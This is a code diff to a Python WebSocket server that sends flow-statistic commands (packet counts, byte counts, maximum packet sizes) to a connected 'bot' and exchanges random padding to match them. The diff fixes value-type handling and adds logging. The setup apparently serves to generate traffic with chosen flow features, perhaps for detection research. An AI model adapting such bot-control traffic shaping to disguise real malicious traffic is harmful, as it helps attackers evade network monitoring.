@@ -172,7 +172,8 @@ class WebSocketServer:
             #return f"{peername[0]}:{peername[1]}"
         return "unknown_client"
     def generate_random_string(self,size:int):
-        return ''.join(random.choices(string.ascii_letters + string.digits, k=int(size[0])))
+        # tip: size should be list but a value only
+        return ''.join(random.choices(string.ascii_letters + string.digits, k=int(size)))
     async def terminate_client(self, client_id):
         """Gracefully close WebSocket connection when termination criteria are met."""
         print(f"⚠️ [{client_id}] Termination conditions met. Closing connection.")
@@ -206,10 +207,12 @@ class WebSocketServer:
                     await websocket.recv()
                     print("🔥 src2dst_max_ps recieved from bot")
                     logging.info(f"🔥 src2dst_max_ps recieved from bot {client_id}")
-                elif "dst2src_max_ps" in key and value != None:
-                    await websocket.send(json.dumps({key:value}))
-                    pad= self.generate_random_string(self.config["dst2src_max_ps"])
+                elif "dst2src_max_ps" in key and value[0] != None and int(value[0]) > 0:
+                    await websocket.send(json.dumps({key:value})) #send cmd to bot to execute
+                    pad= self.generate_random_string(int(value[0]))
                     await websocket.send(pad)
+                    logging.info(f"🔥 Excute dst2src_max_ps  {client_id}")
+                    print ("🔥Execute dst2src_max_ps")
                 elif "src2dst_packets" in key and value[0] != None and int(value[0]) > 0:
                     await websocket.send(json.dumps({key:value}))
                     try:
@@ -222,12 +225,12 @@ class WebSocketServer:
                         print ("🔥Execute src2dst_packets")
                     except websockets.exceptions.ConnectionClosed:
                         print("Connection closed")
-                elif "src2dst_bytes" in key and value != None and value > 0:
+                elif "src2dst_bytes" in key and int(value[0]) != None and int(value[0]) > 0:
                     await websocket.send(json.dumps({key:value}))
                     message = await websocket.recv()
                     logging.info(f"🔥 Excute src2dst_bytes  {client_id}")
                     print ("🔥Execute src2dst_bytes")
-                elif "dst2src_packets" in key and value != None and value > 0:
+                elif "dst2src_packets" in key and value[0] != None and int(value[0]) > 0:
                     await websocket.send(json.dumps({key:value}))
                     pad = ""
                     for i in range(int(value[0])):
@@ -235,7 +238,7 @@ class WebSocketServer:
                     await websocket.send("END")
                     logging.info(f"🔥 Excute dst2src_packets  {client_id}")
                     print ("🔥Execute dst2src_packets")                  
-                elif "dst2src_bytes" in key and int(value[0]) != None and int(value[0]) > 0:
+                elif "dst2src_bytes" in key and value[0] != None and int(value[0]) > 0:
                     await websocket.send(json.dumps({key:value}))
                     pad= self.generate_random_string(int(value[0]))
                     await websocket.send(pad) 
